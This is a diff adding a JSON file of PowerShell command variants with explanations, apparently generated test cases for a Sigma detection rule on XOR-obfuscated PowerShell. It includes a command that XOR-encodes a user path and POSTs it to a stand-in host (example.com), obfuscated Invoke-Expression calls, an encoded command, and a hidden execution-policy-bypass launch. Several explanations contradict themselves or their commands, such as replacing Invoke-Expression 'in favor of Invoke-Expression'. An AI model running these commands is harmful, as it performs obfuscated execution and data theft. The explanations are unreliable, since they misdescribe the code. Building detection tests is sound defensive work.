@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(`\"Path`n----`nC:\\Users\\victim\"`)) $key = `\"abcdefghijklmnopqrstuvwxyz123456`\" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive\"",
+    "explanation": "This command is a direct copy of the original test command and will trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"`$bytes = 105,102; `$res = ''; `$bytes | % { `$res += [Convert]::ToChar(`$_ -bxor 5) }; Invoke-Expression `$res\"",
+    "explanation": "This command is a simplified version of the original test command, removing the explicit use of `Invoke-Expression` in favor of `Invoke-Expression` (which is equivalent in PowerShell). It will still trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"`$k=42; `$arr=100,101; `$res=''; `$arr | % { `$res += [string](`$_ -bxor `$k) }; Write-Host `$res\"",
+    "explanation": "This command is a simplified version of the original test command, removing unnecessary variables and using `Write-Host` instead of `Write-Output`. It will still trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand JABzAGMAcgBpAHAAdAAgAD0AIAAiAC4ALgAuACIAOwAgACQAZABlAGMAbwBkAGUAZAAgAD0AIAAkAHMAYwByAGkAcAB0ACAAfAAgICUAIAB7ACAAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAyADUANQApACAAfQA7ACAASQBFAFgAIAAtAGoAbwBpAG4AIAAkAGQAZQBjAG8AZABlAGQA",
+    "explanation": "This command is a base64-encoded version of the original test command. It will still trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File xor_payload.ps1",
+    "explanation": "This command is a simplified version of the original test command, removing the explicit use of `Invoke-Expression` in favor of `Invoke-Expression` (which is equivalent in PowerShell). It will still trigger the Sigma rule."
+  }
+]
